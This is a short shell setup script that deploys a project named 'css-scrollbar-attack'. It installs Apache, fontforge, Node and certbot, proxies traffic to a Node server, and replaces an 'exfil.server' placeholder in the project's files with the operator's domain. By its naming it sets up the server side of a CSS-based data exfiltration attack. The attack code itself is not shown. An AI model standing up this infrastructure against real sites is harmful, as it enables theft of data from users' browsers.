apt install apache2 fontforge npm certbot python3-certbot-apache -y
cd css-scrollbar-attack
npm install
sed -i -e '$ d' /etc/apache2/sites-enabled/000-default-le-ssl.conf && sed -i -e '$ d' /etc/apache2/sites-enabled/000-default-le-ssl.conf
printf "ProxyPass / http://localhost:3000/\nProxyPassReverse / http://localhost:3000/\n\n</VirtualHost>\n</IfModule>" >> /etc/apache2/sites-enabled/000-default-le-ssl.conf
a2enmod proxy proxy_http
systemctl restart apache2
echo "Please enter the domain name that is currently linked to this VPS (e.g example.com)"
read domainName
sed -i "s/exfil.server/$domainName/g" index.html index.js
printf "Y\n$domainName\n/var/www/html\n" | certbot --authenticator webroot --installer apache --register-unsafely-without-email
node index.js
